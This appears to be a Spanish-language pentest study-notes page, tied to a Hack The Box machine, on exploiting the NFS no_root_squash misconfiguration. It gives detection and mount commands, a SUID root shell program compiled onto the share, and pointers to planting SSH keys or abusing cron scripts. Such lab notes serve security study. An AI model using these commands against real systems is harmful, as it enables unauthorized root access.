# Técnica: nfs no_root_squash

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**1 máquina(s)** mencionan esta técnica.

Alias buscados: `no_root_squash`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<IP>` · `/export/share`

### Detectar

```bash
showmount -e <IP>
nmap -sV -p111,2049 --script "nfs-showmount,nfs-ls,nfs-statfs" <IP>
cat /etc/exports          # si tenés lectura local del archivo
```

Buscá `no_root_squash` en `/etc/exports`. Con esa opción, **root remoto sigue
siendo root** en el share, y eso es escalada directa.

### Montar

```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs <IP>:/export/share /mnt/nfs -o nolock
ls -la /mnt/nfs
df -h | grep nfs
```

### Explotar

```bash
# 1) En TU Kali, como root, con el share montado y escribible:
cat > /mnt/nfs/shell.c << 'FIN_X'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); system("/bin/bash -p"); }
FIN_X

gcc /mnt/nfs/shell.c -o /mnt/nfs/shell
sudo chown root:root /mnt/nfs/shell
sudo chmod 4755 /mnt/nfs/shell
```

```bash
# 2) EN LA VÍCTIMA:
#    Buscá dónde está montado el share (probablemente /ruta/del/share)
ls -la /ruta/del/share/shell
/ruta/del/share/shell
# → root
```

### Si no hay `no_root_squash`

Otras cosas que valen la pena mirar en un share NFS escribible:

- **Claves SSH**: `/root/.ssh/authorized_keys` o `id_rsa` de algún usuario.
- **Scripts que otro proceso ejecuta** (combinable con cron).
- **Archivos de configuración** con credenciales.
- **`/home/<user>/.ssh/authorized_keys`** si el share es `/home`.

### Desmontar

```bash
sudo umount /mnt/nfs
```

### Errores típicos

| Error | Causa |
| --- | --- |
| `access denied` al montar | El export restringe por IP o es solo lectura |
| El archivo SUID no funciona en la víctima | El share está montado `nosuid` |
| `showmount: command not found` | Falta `nfs-common`: `sudo apt install nfs-common` |

## Referencias

- [HackTricks](https://book.hacktricks.wiki/)

---

## Máquinas

- [[htb-fries\|Fries]] — 1 mención(es) · Windows · Hard

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'nfs no_root_squash' -v
python3 _sistema/herramientas/buscar.py 'nfs no_root_squash' -v --oscp
```
